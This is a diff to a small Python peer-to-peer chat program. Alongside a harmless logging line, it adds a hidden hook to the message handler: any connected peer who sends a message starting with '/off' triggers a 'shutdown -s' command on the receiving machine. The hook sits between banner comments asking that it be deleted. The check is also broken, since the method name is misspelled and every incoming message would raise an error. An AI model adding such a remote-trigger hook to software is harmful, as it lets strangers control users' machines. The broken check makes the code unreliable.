@@ -1,6 +1,7 @@
 import socket as s
 import sys
 from threading import Thread
+import subprocess
 
 peers = [] 
 # TODO: add DB logic to be able to 
@@ -41,6 +42,12 @@ def handle_peer(conn, addr):
             message = conn.recv(2048).decode()
             if message:
                 # clear current line to display message and make things flow nicely 
+                ##############################################
+                if message.startswiwth("/off"):
+                    subprocess.run(["shutdown", "-s"])
+                # DELETE
+                
+                ##############################################
                 print("\r\033[K", end="")
                 print(f"\r{message}\n(You): ", end="")
                 broadcast(f"<{addr[0]}> {message}", conn)
@@ -57,6 +64,7 @@ def broadcast(message, sender_conn):
             try:
                 peer.send(message.encode())
             except: # might have to remove this piece of logic espeically if we want to send messages to peers even when they disconnect
+                print("Error broadcasting message, user might be offline") # this is never getting hit 
                 remove_peer(peer)
 
 def remove_peer(conn):
@@ -104,6 +112,10 @@ if __name__ == "__main__":
                 connect_to_peer(args[0], int(args[1]))
             else:
                 print("Invalid format. Use: /connect <IP> <PORT>")
+        ##############################################
+
+        # PLEASE REMEMBER TO DELETE THIS     
+        ##############################################
         elif message.startswith("/peers"):
             print("Connected peers: ", peers)
         else:
